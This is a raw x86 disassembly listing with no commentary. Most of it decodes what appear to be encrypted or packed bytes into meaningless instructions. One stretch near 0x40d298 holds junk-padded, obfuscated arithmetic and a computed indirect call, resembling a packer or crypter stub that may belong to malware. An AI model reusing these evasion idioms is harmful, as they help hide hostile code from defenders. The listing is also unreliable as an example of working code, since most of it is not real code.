  40cd21:	lods   eax,DWORD PTR ds:[esi]
  40cd22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd23:	mov    esp,0xb913321b
  40cd28:	cmc    
  40cd29:	test   al,0x52
  40cd2b:	js     0x40cd06
  40cd2d:	aam    0x20
  40cd2f:	mov    cl,ah
  40cd31:	mov    DWORD PTR [edx-0x446cb847],esp
  40cd37:	xlat   BYTE PTR ds:[ebx]
  40cd38:	and    eax,0x67c3d797
  40cd3d:	sub    eax,0x5cc62bb4
  40cd42:	dec    ebp
  40cd43:	or     eax,0x3a8e0a66
  40cd48:	popf   
  40cd49:	mov    edx,0x8d73c0f7
  40cd4e:	or     edi,edx
  40cd50:	jne    0x40cd61
  40cd52:	js     0x40ccdc
  40cd54:	mov    cl,0xc9
  40cd56:	cmp    eax,0x8e0b0648
  40cd5b:	lods   eax,DWORD PTR ds:[esi]
  40cd5c:	mov    dh,0xb7
  40cd5e:	jb     0x40cd19
  40cd60:	jnp    0x40cd52
  40cd62:	mov    ds:0xf6e5c18e,al
  40cd67:	cmp    eax,0x7323e250
  40cd6c:	dec    ebp
  40cd6d:	jae    0x40ccfa
  40cd6f:	mov    ch,0x97
  40cd71:	pusha  
  40cd72:	and    cl,al
  40cd74:	out    dx,al
  40cd75:	cmp    dl,bl
  40cd77:	lods   eax,DWORD PTR ds:[esi]
  40cd78:	retf   
  40cd79:	jle    0x40cd71
  40cd7b:	mov    bh,0xc3
  40cd7d:	sbb    edi,ebx
  40cd7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd80:	xchg   edi,eax
  40cd81:	cdq    
  40cd82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd83:	adc    DWORD PTR [ebp-0x7],esi
  40cd86:	mov    ecx,cs
  40cd88:	in     al,0x7e
  40cd8a:	sub    al,0xfc
  40cd8c:	mov    esi,DWORD PTR [ebp-0x76]
  40cd8f:	out    dx,eax
  40cd90:	lods   al,BYTE PTR ds:[esi]
  40cd91:	mov    esi,esi
  40cd93:	or     eax,0xe85a98fe
  40cd98:	pushf  
  40cd99:	aam    0xe1
  40cd9b:	scas   eax,DWORD PTR es:[edi]
  40cd9c:	jp     0x40cd82
  40cd9e:	fisttp DWORD PTR [ecx+ecx*1-0x3502da5]
  40cda5:	push   es
  40cda6:	scas   al,BYTE PTR es:[edi]
  40cda7:	push   ecx
  40cda8:	push   0xe81955a8
  40cdad:	mov    dh,al
  40cdaf:	xchg   esi,eax
  40cdb0:	mov    eax,ds:0x869f0b08
  40cdb5:	int    0x9a
  40cdb7:	sub    BYTE PTR [ebx+0x56],dh
  40cdba:	outs   dx,DWORD PTR ds:[esi]
  40cdbb:	sub    eax,0x12d6dc64
  40cdc0:	nop
  40cdc1:	loopne 0x40cde3
  40cdc3:	jns    0x40cda9
  40cdc5:	loop   0x40cd78
  40cdc7:	jno    0x40ce3d
  40cdc9:	cmp    BYTE PTR [eax],bh
  40cdcb:	add    BYTE PTR [eax-0x72],cl
  40cdce:	jbe    0x40cd6a
  40cdd0:	push   edx
  40cdd1:	gs jmp 0x35910f84
  40cdd7:	jl     0x40cda2
  40cdd9:	mov    ah,0x8d
  40cddb:	xor    al,0xae
  40cddd:	ins    BYTE PTR es:[edi],dx
  40cdde:	dec    esp
  40cddf:	sti    
  40cde0:	in     al,0xd1
  40cde2:	ins    BYTE PTR es:[edi],dx
  40cde3:	mov    edi,DWORD PTR [edx-0x42c49f9f]
  40cde9:	test   eax,0x597c3f7d
  40cdee:	jl     0x40ce27
  40cdf0:	shl    BYTE PTR [eax-0x1],1
  40cdf3:	push   esi
  40cdf4:	xor    DWORD PTR [ecx+0xd],ecx
  40cdf7:	mov    BYTE PTR [ecx-0x54],dl
  40cdfa:	mov    ds:0x40e167c7,eax
  40cdff:	xchg   ebx,eax
  40ce00:	push   esp
  40ce01:	in     eax,dx
  40ce02:	lahf   
  40ce03:	icebp  
  40ce04:	fwait
  40ce05:	push   cs
  40ce06:	in     eax,0xd9
  40ce08:	imul   edx,DWORD PTR [ecx+0x7c817d9d],0xa8dd5baa
  40ce12:	xchg   BYTE PTR [eax+ebx*4],ah
  40ce15:	dec    esp
  40ce16:	je     0x40ce1c
  40ce18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce19:	inc    ebx
  40ce1a:	(bad)  
  40ce1b:	push   0x265e30e5
  40ce20:	adc    BYTE PTR [ebx],bl
  40ce22:	pushf  
  40ce23:	add    eax,0xf151d597
  40ce28:	sbb    edi,DWORD PTR [ecx-0x45]
  40ce2b:	cmp    ebx,DWORD PTR ds:0x99447560
  40ce31:	leave  
  40ce32:	sub    al,0x9d
  40ce34:	mov    esp,0xdc41755e
  40ce39:	mov    WORD PTR [ebx],es
  40ce3b:	push   edi
  40ce3c:	push   0xab053a37
  40ce41:	scas   al,BYTE PTR es:[edi]
  40ce42:	int3   
  40ce43:	lods   al,BYTE PTR ds:[esi]
  40ce44:	jno    0x40ce2f
  40ce46:	pop    ecx
  40ce47:	pop    ebx
  40ce48:	sar    DWORD PTR [eax-0x39],cl
  40ce4b:	inc    edi
  40ce4c:	ffreep st(3)
  40ce4e:	inc    edi
  40ce4f:	xor    ah,BYTE PTR ds:0x60a6b2b5
  40ce55:	outs   dx,DWORD PTR ds:[esi]
  40ce56:	fs adc ecx,edi
  40ce59:	not    BYTE PTR [ebx]
  40ce5b:	and    eax,0x77a928ed
  40ce60:	fidivr DWORD PTR [edi]
  40ce62:	jo     0x40ce41
  40ce64:	ja     0x40ceab
  40ce66:	xchg   edi,eax
  40ce67:	add    bh,BYTE PTR [eax-0x69ac9565]
  40ce6d:	add    ah,bh
  40ce6f:	dec    esp
  40ce70:	sahf   
  40ce71:	mov    ebp,esp
  40ce73:	mov    ecx,0x1049ed75
  40ce78:	mov    edx,0xce3ce9ba
  40ce7d:	cwde   
  40ce7e:	dec    esp
  40ce7f:	cmp    edi,eax
  40ce81:	pop    edx
  40ce82:	rcr    ebp,0xb7
  40ce85:	mov    al,ds:0xa8a9080b
  40ce8a:	mov    al,0x15
  40ce8c:	xlat   BYTE PTR ds:[ebx]
  40ce8d:	add    eax,0xcc442bb4
  40ce92:	outs   dx,BYTE PTR ds:[esi]
  40ce93:	addr16 jmp 0xc92e:0x40e8eaeb
  40ce9b:	aas    
  40ce9c:	or     eax,DWORD PTR [ecx-0x3b]
  40ce9f:	inc    esi
  40cea0:	push   esi
  40cea1:	icebp  
  40cea2:	outs   dx,DWORD PTR ds:[esi]
  40cea3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cea4:	sbb    DWORD PTR ds:0xade7f552,esi
  40ceaa:	scas   al,BYTE PTR es:[edi]
  40ceab:	fisubr DWORD PTR [ecx+0x1749dc3c]
  40ceb1:	arpl   dx,dx
  40ceb3:	das    
  40ceb4:	sbb    eax,0xae7d51e
  40ceb9:	lods   eax,DWORD PTR ds:[esi]
  40ceba:	test   al,0x2a
  40cebc:	add    BYTE PTR [ebx+0x794b829],ah
  40cec2:	pop    edx
  40cec3:	jb     0x40cece
  40cec5:	cmp    eax,0xa212187c
  40ceca:	int    0xe8
  40cecc:	push   cs
  40cecd:	adc    al,0xf9
  40cecf:	repnz cmp al,BYTE PTR [edi+0x1ec1a6a5]
  40ced6:	(bad)  
  40ced7:	stos   DWORD PTR es:[edi],eax
  40ced8:	lods   al,BYTE PTR ds:[esi]
  40ced9:	jge    0x40ceef
  40cedb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cedc:	mov    esp,0x7ffdb11
  40cee1:	iret   
  40cee2:	and    DWORD PTR [edi+0x179b9a1d],edx
  40cee8:	in     al,dx
  40cee9:	fcmovb st,st(3)
  40ceeb:	mov    edx,0xf350f6ce
  40cef0:	mov    esp,0xe14e419f
  40cef5:	jp     0x40cf27
  40cef7:	mov    ?,WORD PTR [edi-0x6c33ddfb]
  40cefd:	pop    ds
  40cefe:	stos   BYTE PTR es:[edi],al
  40ceff:	xor    ch,BYTE PTR [esi]
  40cf01:	adc    al,0x42
  40cf03:	dec    ecx
  40cf04:	leave  
  40cf05:	inc    ecx
  40cf06:	pop    ecx
  40cf07:	push   cs
  40cf08:	and    eax,0x10e0d85b
  40cf0d:	stos   DWORD PTR es:[edi],eax
  40cf0e:	mov    eax,ds:0x85a7877d
  40cf13:	lds    esp,FWORD PTR [ebx]
  40cf15:	cmp    esi,DWORD PTR [edx+eiz*1]
  40cf18:	push   ecx
  40cf19:	pop    eax
  40cf1a:	jecxz  0x40ced7
  40cf1c:	xchg   esi,eax
  40cf1d:	pop    esi
  40cf1e:	out    0x8,eax
  40cf20:	dec    esp
  40cf21:	mov    bh,0xa2
  40cf23:	jmp    0x40cee8
  40cf25:	add    eax,0x3952e7ce
  40cf2a:	xchg   ebp,eax
  40cf2b:	sub    BYTE PTR [ecx+edx*2-0x18],dl
  40cf2f:	shr    BYTE PTR [edi],1
  40cf31:	sbb    eax,0x634b224
  40cf36:	pop    esp
  40cf37:	cmp    esp,ebp
  40cf39:	cwde   
  40cf3a:	ins    DWORD PTR es:[edi],dx
  40cf3b:	mov    ch,BYTE PTR [esi-0x7d]
  40cf3e:	and    ah,BYTE PTR [eax]
  40cf40:	dec    esi
  40cf41:	push   es
  40cf42:	ret    
  40cf43:	loop   0x40cfc2
  40cf45:	dec    ecx
  40cf46:	push   ss
  40cf47:	gs mov edi,0xd113f92
  40cf4d:	stos   BYTE PTR es:[edi],al
  40cf4e:	push   ss
  40cf4f:	mov    ds:0xe706196f,al
  40cf54:	mov    edi,0xdf2d9278
  40cf59:	inc    esp
  40cf5a:	retf   
  40cf5b:	ret    
  40cf5c:	add    al,0xf7
  40cf5e:	jecxz  0x40cf26
  40cf60:	ficomp DWORD PTR [edx+0x582fa504]
  40cf66:	add    BYTE PTR [ecx-0x372a5f6a],dh
  40cf6c:	cmp    eax,0x8bee8039
  40cf71:	in     al,dx
  40cf72:	mov    dh,0x41
  40cf74:	cs nop
  40cf76:	xchg   edi,eax
  40cf77:	imul   eax,DWORD PTR [esp+ebp*8-0x1d3e3644],0x46743718
  40cf82:	inc    eax
  40cf83:	add    DWORD PTR [ebp+0x71d86598],esp
  40cf89:	test   eax,0x4d0edc8e
  40cf8e:	and    al,0x7d
  40cf90:	data16 jns 0x40cf38
  40cf93:	mov    dh,0x33
  40cf95:	sbb    BYTE PTR [eax],bh
  40cf97:	retf   
  40cf98:	and    al,BYTE PTR [eax]
  40cf9a:	cmp    ch,BYTE PTR [ebx+0x7b]
  40cf9d:	dec    DWORD PTR [edi+eiz*2-0x61101a67]
  40cfa4:	scas   eax,DWORD PTR es:[edi]
  40cfa5:	adc    ebx,DWORD PTR [ebp-0x41]
  40cfa8:	add    bh,dl
  40cfaa:	stos   DWORD PTR es:[edi],eax
  40cfab:	push   ecx
  40cfac:	and    ah,BYTE PTR [ebx-0x3e]
  40cfaf:	pushf  
  40cfb0:	pop    ebp
  40cfb1:	popa   
  40cfb2:	daa    
  40cfb3:	xor    al,0x1e
  40cfb5:	mov    eax,ds:0x11e3d661
  40cfba:	das    
  40cfbb:	sbb    al,0xc9
  40cfbd:	fsubr  DWORD PTR [edi]
  40cfbf:	cmp    DWORD PTR [ebp+0x44],eax
  40cfc2:	sbb    ah,bl
  40cfc4:	adc    esp,DWORD PTR [esi-0x56f3e842]
  40cfca:	iret   
  40cfcb:	jbe    0x40cffc
  40cfcd:	or     BYTE PTR [ecx+0x5d],0x43
  40cfd1:	pop    ecx
  40cfd2:	xchg   esp,eax
  40cfd3:	imul   esi,ecx,0xffffff80
  40cfd6:	cmp    dh,al
  40cfd8:	push   ds
  40cfd9:	in     al,dx
  40cfda:	imul   edi,DWORD PTR es:[esi-0x44],0x6abab47e
  40cfe2:	cld    
  40cfe3:	loope  0x40cf71
  40cfe5:	shl    BYTE PTR [esi+0x596a744f],cl
  40cfeb:	fdivr  QWORD PTR [edi+0x48dfc303]
  40cff1:	jmp    0x40d00a
  40cff3:	iret   
  40cff4:	sub    DWORD PTR [edi+0x1b],ecx
  40cff7:	xchg   BYTE PTR [edi+0x47a7bb9c],dl
  40cffd:	sub    eax,0x9e8bd59f
  40d002:	sub    al,BYTE PTR [ebx-0x2c]
  40d005:	jns    0x40d01d
  40d007:	dec    esi
  40d008:	mov    ds:0x9ec40214,al
  40d00d:	dec    ecx
  40d00e:	cmp    ebx,DWORD PTR [esi+0x47]
  40d011:	or     edi,DWORD PTR [esi-0x71]
  40d014:	dec    ebx
  40d015:	mov    esp,0xaef2dbc8
  40d01a:	cmp    BYTE PTR [edx+ecx*2],al
  40d01d:	push   esp
  40d01e:	loopne 0x40d053
  40d020:	int    0xf5
  40d022:	fst    DWORD PTR ds:0x30077528
  40d028:	in     eax,dx
  40d029:	or     bh,0x2f
  40d02c:	repnz (bad) 
  40d02e:	push   ebx
  40d02f:	dec    eax
  40d030:	mov    gs,ebx
  40d032:	shl    BYTE PTR [ebx],0xcc
  40d035:	push   ds
  40d036:	(bad)  
  40d037:	cdq    
  40d038:	test   al,0x2a
  40d03a:	or     edi,esi
  40d03c:	xchg   esp,eax
  40d03d:	jp     0x40d010
  40d03f:	cdq    
  40d040:	adc    al,BYTE PTR [ebx+ecx*8+0x338a2cbe]
  40d047:	inc    edi
  40d048:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d049:	ffreep st(6)
  40d04b:	sar    DWORD PTR [esi-0x47],cl
  40d04e:	mov    BYTE PTR [ebx+0x7a],dl
  40d051:	or     eax,0x9f66d3f9
  40d056:	ins    DWORD PTR es:[edi],dx
  40d057:	jno    0x40d04a
  40d059:	push   0xeff908f3
  40d05e:	mov    dl,0x7a
  40d060:	xor    DWORD PTR [ebp-0x40],0x44c12d93
  40d067:	lods   al,BYTE PTR ds:[esi]
  40d068:	(bad)  
  40d069:	out    0x37,al
  40d06b:	(bad)  
  40d06c:	fwait
  40d06d:	test   BYTE PTR [ebp+0x6042f7f],bh
  40d073:	jb     0x40d025
  40d075:	sub    al,0xb4
  40d077:	pushf  
  40d078:	mov    al,0xe8
  40d07a:	js     0x40d016
  40d07c:	adc    BYTE PTR [edi+ecx*8-0x4379e478],bh
  40d083:	sub    bh,bh
  40d085:	jae    0x40d092
  40d087:	push   0x46
  40d089:	mov    ebp,0x5e48b3a0
  40d08e:	out    0xbb,al
  40d090:	and    eax,0x687dbefc
  40d095:	add    DWORD PTR [eax+0x39],ebx
  40d098:	das    
  40d099:	out    0xf1,eax
  40d09b:	popf   
  40d09c:	adc    BYTE PTR [edi-0x29],cl
  40d09f:	arpl   WORD PTR [esp+ebx*1-0x59],cx
  40d0a3:	aam    0x3b
  40d0a5:	pop    esi
  40d0a6:	jb     0x40d0f6
  40d0a8:	cdq    
  40d0a9:	sub    BYTE PTR [ebx],ah
  40d0ab:	(bad)  
  40d0ac:	fistp  WORD PTR [ecx-0x2286d349]
  40d0b2:	inc    ebp
  40d0b3:	mov    BYTE PTR [edi+0x684c6043],al
  40d0b9:	out    dx,al
  40d0ba:	ss add ah,cl
  40d0bd:	inc    esi
  40d0be:	ret    0xe647
  40d0c1:	dec    eax
  40d0c2:	xchg   esi,eax
  40d0c3:	std    
  40d0c4:	jp     0x40d113
  40d0c6:	ins    DWORD PTR es:[edi],dx
  40d0c7:	stos   DWORD PTR es:[edi],eax
  40d0c8:	mov    ds:0xed398c37,eax
  40d0cd:	stos   DWORD PTR es:[edi],eax
  40d0ce:	jge    0x40d0b5
  40d0d0:	iret   
  40d0d1:	push   ds
  40d0d2:	popa   
  40d0d3:	lock sbb al,BYTE PTR ss:[ecx-0x16]
  40d0d8:	push   esi
  40d0d9:	repz mov cl,0x28
  40d0dc:	sub    al,0xaf
  40d0de:	pop    ss
  40d0df:	(bad)  
  40d0e0:	sbb    DWORD PTR [esi-0x4d],ebp
  40d0e3:	or     al,0xd
  40d0e5:	test   al,0x20
  40d0e7:	add    ebx,DWORD PTR [edx+0x6b]
  40d0ea:	repnz ds cli 
  40d0ed:	(bad)  
  40d0ee:	adc    eax,0x78d7fc4d
  40d0f3:	dec    ecx
  40d0f4:	stos   BYTE PTR es:[edi],al
  40d0f5:	aad    0x8a
  40d0f7:	push   ss
  40d0f8:	and    dh,BYTE PTR [esi]
  40d0fa:	sub    BYTE PTR [ecx],bh
  40d0fc:	jmp    0x40d150
  40d0fe:	add    eax,0x47a29550
  40d103:	gs jp  0x40d09b
  40d106:	aaa    
  40d107:	cmp    edx,DWORD PTR [ebp-0x708411fe]
  40d10d:	ins    DWORD PTR es:[edi],dx
  40d10e:	dec    edx
  40d10f:	add    eax,DWORD PTR [eax]
  40d111:	icebp  
  40d112:	add    dh,bl
  40d114:	jmp    0xf012:0x4350231f
  40d11b:	jmp    0x4d9844ec
  40d120:	add    ebx,DWORD PTR [ebx]
  40d122:	and    al,0xb
  40d124:	or     bh,dl
  40d126:	pop    edx
  40d127:	mov    ecx,0x6eec9b22
  40d12c:	cmp    dh,dl
  40d12e:	rol    al,cl
  40d130:	in     eax,0x63
  40d132:	or     DWORD PTR [ebp+ebx*2+0x41],ecx
  40d136:	outs   dx,DWORD PTR ds:[esi]
  40d137:	adc    BYTE PTR [edx-0x4a],cl
  40d13a:	push   ss
  40d13b:	cmc    
  40d13c:	ss mov dh,0x7e
  40d13f:	leave  
  40d140:	mov    bl,0xc3
  40d142:	inc    ebx
  40d143:	imul   ebx,edi,0xffffffde
  40d146:	mov    BYTE PTR ds:0x6e94cdf0,bl
  40d14c:	cmp    al,0x1d
  40d14e:	jae    0x40d17e
  40d150:	dec    eax
  40d151:	xor    dh,BYTE PTR [esi+ebp*2]
  40d154:	ins    DWORD PTR es:[edi],dx
  40d155:	push   ecx
  40d156:	push   es
  40d157:	std    
  40d158:	sub    DWORD PTR [eax+0x79],edx
  40d15b:	sub    ebx,0x4
  40d15e:	hlt    
  40d15f:	jg     0x40d14c
  40d161:	sbb    dl,BYTE PTR [edi]
  40d163:	leave  
  40d164:	fst    DWORD PTR [edi-0x22e62b72]
  40d16a:	retf   0x9db0
  40d16d:	jle    0x40d169
  40d16f:	push   ecx
  40d170:	ja     0x40d1db
  40d172:	ret    0xec46
  40d175:	inc    edi
  40d176:	jecxz  0x40d0f8
  40d178:	outs   dx,BYTE PTR ds:[esi]
  40d179:	(bad)  
  40d17a:	cli    
  40d17b:	cli    
  40d17c:	es mov bh,0x46
  40d17f:	pop    ebx
  40d180:	mov    gs,WORD PTR [ebx+ecx*1]
  40d183:	fbstp  TBYTE PTR [edi+0x7ac3a187]
  40d189:	je     0x40d1de
  40d18b:	or     ch,BYTE PTR [esi-0x4b04b08d]
  40d191:	xor    DWORD PTR [eax-0x3d0bd7cd],eax
  40d197:	daa    
  40d198:	push   edx
  40d199:	jne    0x40d1e5
  40d19b:	fld    QWORD PTR [ebp+0x10]
  40d19e:	in     al,0xa0
  40d1a0:	push   edi
  40d1a1:	mov    dl,BYTE PTR [ebp+0x33]
  40d1a4:	fild   WORD PTR [eax+0x46d041a7]
  40d1aa:	daa    
  40d1ab:	jmp    0x4eaa:0xbd77ba6
  40d1b2:	dec    ebx
  40d1b3:	jmp    0x40d165
  40d1b5:	arpl   WORD PTR [ebp-0x613bbdd9],si
  40d1bb:	xchg   esp,eax
  40d1bc:	mov    ch,0x44
  40d1be:	cwde   
  40d1bf:	adc    ch,bh
  40d1c1:	nop
  40d1c2:	mov    DWORD PTR [esi-0x5d],edi
  40d1c5:	inc    esp
  40d1c6:	cwde   
  40d1c7:	rcl    BYTE PTR [edi+0x2f],0xfd
  40d1cb:	push   ebp
  40d1cc:	imul   edi,DWORD PTR [edx],0xc04382d8
  40d1d2:	(bad)  
  40d1d3:	fxch   st(1)
  40d1d5:	xor    edx,edi
  40d1d7:	scas   eax,DWORD PTR es:[edi]
  40d1d8:	mov    ebx,0xbf7f8c
  40d1dd:	cmp    al,0x8e
  40d1df:	push   ecx
  40d1e0:	cs adc esp,ecx
  40d1e3:	rol    DWORD PTR [ecx],0x21
  40d1e6:	sbb    ecx,DWORD PTR [ebx-0x70]
  40d1e9:	(bad)  
  40d1eb:	psrlq  mm0,QWORD PTR [esi+eiz*4]
  40d1ef:	mov    ds:0x823b4a2b,eax
  40d1f4:	pop    edx
  40d1f5:	adc    al,0xa0
  40d1f7:	sahf   
  40d1f8:	mov    dl,0xde
  40d1fa:	lock sahf 
  40d1fc:	call   0x48fa:0x2d705d03
  40d203:	mov    ebx,0x683c913f
  40d208:	scas   al,BYTE PTR es:[edi]
  40d209:	jns    0x40d231
  40d20b:	sub    ch,BYTE PTR [esp+ebx*2]
  40d20e:	xchg   ecx,eax
  40d20f:	inc    edi
  40d210:	gs in  al,0x5b
  40d213:	sbb    eax,0x6b29c98e
  40d218:	es pop es
  40d21a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d21b:	into   
  40d21c:	xchg   edi,eax
  40d21d:	mov    ah,0x60
  40d21f:	xlat   BYTE PTR ds:[ebx]
  40d220:	rol    DWORD PTR [edx+0x3a],0x9
  40d224:	aam    0x6b
  40d226:	pop    ecx
  40d227:	mov    al,ds:0x982fa14c
  40d22c:	xchg   DWORD PTR [edi+0x34d008dd],edx
  40d232:	in     eax,dx
  40d233:	jbe    0x40d277
  40d235:	and    edx,DWORD PTR [edx]
  40d237:	lea    esi,[edx-0x26]
  40d23a:	mov    eax,0xa0ee64b5
  40d23f:	jg     0x40d1d3
  40d241:	xchg   esi,eax
  40d242:	jmp    0x40d288
  40d244:	lods   eax,DWORD PTR ds:[esi]
  40d245:	adc    al,0x8
  40d247:	sbb    BYTE PTR [eax+0x67],cl
  40d24a:	out    dx,eax
  40d24b:	addr16 inc edx
  40d24d:	loop   0x40d21b
  40d24f:	add    bh,BYTE PTR [ecx+0x16]
  40d252:	dec    ebp
  40d253:	mov    dh,0x5a
  40d255:	fnstsw WORD PTR [ecx+0x2d]
  40d258:	xchg   edx,eax
  40d259:	or     DWORD PTR [ecx],esp
  40d25b:	mov    ds:0x75fbfd8a,al
  40d260:	ja     0x40d2c1
  40d262:	pop    ebp
  40d263:	(bad)  
  40d264:	push   ebp
  40d265:	std    
  40d266:	dec    eax
  40d267:	xor    BYTE PTR [eax+0x37a5fec1],bl
  40d26d:	cld    
  40d26e:	xor    dl,cl
  40d270:	xchg   ecx,eax
  40d271:	sub    eax,0x1d2d7a9b
  40d276:	fwait
  40d277:	pop    ds
  40d278:	mov    cs:0xe4455f93,al
  40d27e:	stos   BYTE PTR es:[edi],al
  40d27f:	ins    BYTE PTR es:[edi],dx
  40d280:	adc    DWORD PTR [ecx+0x2f],ebx
  40d283:	sub    bh,BYTE PTR [eax+0x784c60cf]
  40d289:	push   eax
  40d28a:	xor    DWORD PTR [eax],ebp
  40d28c:	mov    BYTE PTR [ecx-0x5a],0x6b
  40d290:	and    BYTE PTR [ebx-0x33],dl
  40d293:	out    0x5a,al
  40d295:	push   edx
  40d296:	fcmovu st,st(5)
  40d298:	mov    eax,DWORD PTR [ebp-0x1c]
  40d29b:	test   eax,eax
  40d29d:	je     0x40d339
  40d2a3:	mov    DWORD PTR [ebp-0x20],0x0
  40d2aa:	push   edx
  40d2ab:	pop    eax
  40d2ac:	push   0x5
  40d2ae:	sub    edx,eax
  40d2b0:	pop    edx
  40d2b1:	add    edx,0xa
  40d2b4:	push   edx
  40d2b5:	pop    ecx
  40d2b6:	push   0xa
  40d2b8:	dec    ecx
  40d2b9:	pop    ebx
  40d2ba:	dec    ebx
  40d2bb:	xchg   ebx,ecx
  40d2bd:	sub    ebx,ecx
  40d2bf:	xchg   ebx,ecx
  40d2c1:	dec    ecx
  40d2c2:	mov    eax,DWORD PTR [ebp-0x1c]
  40d2c5:	imul   eax,ecx
  40d2c8:	sub    esp,eax
  40d2ca:	mov    DWORD PTR [ebp-0x20],esp
  40d2cd:	mov    eax,DWORD PTR [ebp-0x4]
  40d2d0:	xor    eax,esi
  40d2d2:	add    eax,edi
  40d2d4:	jmp    0x40d312
  40d2d9:	mov    ecx,DWORD PTR [ebp-0xc]
  40d2dc:	mov    eax,DWORD PTR [ebp+0x8]
  40d2df:	mov    edx,DWORD PTR [ebp+0x14]
  40d2e2:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d2e6:	xor    ecx,esi
  40d2e8:	add    ecx,edi
  40d2ea:	xor    edx,edx
  40d2ec:	div    ecx
  40d2ee:	mov    ecx,DWORD PTR [ebp-0x4]
  40d2f1:	xor    ecx,esi
  40d2f3:	lea    eax,[ecx+eax*1+0x3272fa]
  40d2fa:	mov    ecx,DWORD PTR [ebp+0x8]
  40d2fd:	mov    edx,DWORD PTR [ebp-0x20]
  40d300:	mov    DWORD PTR [edx+ecx*4],eax
  40d303:	mov    eax,DWORD PTR [ebp-0xc]
  40d306:	mov    ecx,DWORD PTR [ebp+0x8]
  40d309:	xor    eax,esi
  40d30b:	lea    eax,[eax+ecx*1+0x3272fa]
  40d312:	mov    DWORD PTR [ebp+0x8],eax
  40d315:	mov    eax,DWORD PTR [ebp-0xc]
  40d318:	mov    ecx,DWORD PTR [ebp+0x14]
  40d31b:	xor    eax,esi
  40d31d:	add    eax,edi
  40d31f:	imul   eax,DWORD PTR [ecx]
  40d322:	mov    ecx,DWORD PTR [ebp-0x4]
  40d325:	mov    edx,DWORD PTR [ebp+0x8]
  40d328:	xor    ecx,esi
  40d32a:	lea    ecx,[ecx+edx*1+0x3272fa]
  40d331:	cmp    ecx,eax
  40d333:	jne    0x40d2d9
  40d339:	mov    eax,DWORD PTR [ebp-0x4]
  40d33c:	xor    eax,esi
  40d33e:	add    eax,edi
  40d340:	mov    DWORD PTR [ebp-0x10],eax
  40d343:	and    ebx,0x6547647
  40d349:	xor    ebx,0x8768765
  40d34f:	xchg   ebx,esi
  40d351:	xor    ebx,ebx
  40d353:	push   esi
  40d354:	mov    esi,ebx
  40d356:	pop    ebx
  40d357:	mov    edx,esi
  40d359:	add    ebx,0x1002
  40d35f:	lea    eax,[ebp-0x18]
  40d362:	add    edx,eax
  40d364:	add    edx,0x5
  40d367:	push   edx
  40d368:	inc    esi
  40d369:	pop    ecx
  40d36a:	dec    ecx
  40d36b:	xchg   ecx,eax
  40d36c:	dec    eax
  40d36d:	xchg   ecx,eax
  40d36e:	dec    ecx
  40d36f:	xchg   ecx,edx
  40d371:	dec    edx
  40d372:	push   edx
  40d373:	mov    edx,ebx
  40d375:	pop    ebx
  40d376:	dec    ebx
  40d377:	call   DWORD PTR [ebx]
  40d379:	cmp    DWORD PTR [ebp+0x10],esi
  40d37c:	je     0x40d39d
  40d382:	xchg   edx,eax
  40d383:	push   0xc
  40d385:	pop    ecx
  40d386:	dec    ecx
  40d387:	push   0x3
  40d389:	pop    ebx
  40d38a:	inc    ebx
  40d38b:	xchg   ebx,ecx
  40d38d:	inc    ecx
  40d38e:	sub    ebx,ecx
  40d390:	xchg   ebx,ecx
  40d392:	dec    ecx
  40d393:	dec    ecx
  40d394:	mov    eax,DWORD PTR [ebp-0x1c]
  40d397:	imul   eax,ecx
  40d39a:	add    esp,eax
  40d39c:	xchg   edx,eax
  40d39d:	push   eax
  40d39e:	xor    ebx,ebx
  40d3a0:	mov    edx,esp
  40d3a2:	dec    edx
  40d3a3:	inc    ebx
  40d3a4:	add    ebx,DWORD PTR [edx+ebx*1]
  40d3a7:	dec    ebx
  40d3a8:	xor    edx,edx
  40d3aa:	add    DWORD PTR [ebp-0x10],ebx
  40d3ad:	pop    ebx
  40d3ae:	mov    eax,DWORD PTR [ebp-0x10]
  40d3b1:	pop    edi
  40d3b2:	pop    esi
  40d3b3:	pop    ebx
  40d3b4:	leave  
  40d3b5:	ret    0x10
  40d3b8:	push   ebp
  40d3b9:	mov    ebp,esp
  40d3bb:	push   ecx
  40d3bc:	or     DWORD PTR ds:0x426f29,0x4a1b
  40d3c6:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40d3cd:	movzx  edx,BYTE PTR ds:0x426f19
  40d3d4:	sub    DWORD PTR ds:0x426f21,edx
  40d3da:	mov    eax,DWORD PTR [ebp-0x4]
  40d3dd:	mov    DWORD PTR ds:0x426e91,0x1a
  40d3e7:	cmp    DWORD PTR ds:0x426e91,0x0
  40d3ee:	je     0x40d421
  40d3f4:	cmp    DWORD PTR ds:0x426e91,0x24
  40d3fb:	jl     0x40d421
  40d401:	jmp    0x40d40f
  40d406:	push   DWORD PTR [ebp-0xc]
  40d409:	call   DWORD PTR ds:0x430a2c
  40d40f:	mov    edx,DWORD PTR ds:0x426e91
  40d415:	dec    edx
  40d416:	mov    DWORD PTR ds:0x426e91,edx
  40d41c:	jmp    0x40d3e7
  40d421:	mov    edx,DWORD PTR [ebp+0x10]
  40d424:	xor    ecx,0x6edc
  40d42a:	jmp    0x40f7c6
  40d42f:	mov    ah,0x4a
  40d431:	hlt    
  40d432:	mov    ebx,0x74b46574
  40d437:	ja     0x40d48b
  40d439:	out    dx,al
  40d43a:	je     0x40d490
  40d43c:	mov    cl,0xc2
  40d43e:	jmp    0x40d45a
  40d440:	sub    bh,BYTE PTR [ebx+0x7b]
  40d443:	clc    
  40d444:	pushf  
  40d445:	jnp    0x40d4c2
  40d447:	ret    0x1070
  40d44a:	push   edx
  40d44b:	or     DWORD PTR [esp+esi*1],0xf09f4aa0
  40d452:	and    BYTE PTR [edi+0x66],ah
  40d455:	(bad)  
  40d457:	mov    ecx,0xa0bdce15
  40d45c:	mov    bh,0xbf
  40d45e:	push   edi
  40d45f:	push   eax
  40d460:	and    cl,BYTE PTR [ecx-0x58]
  40d463:	push   es
  40d464:	std    
  40d465:	sbb    eax,0xf0aedbd
  40d46a:	out    dx,eax
  40d46b:	mov    dh,0xfa
  40d46d:	dec    ebp
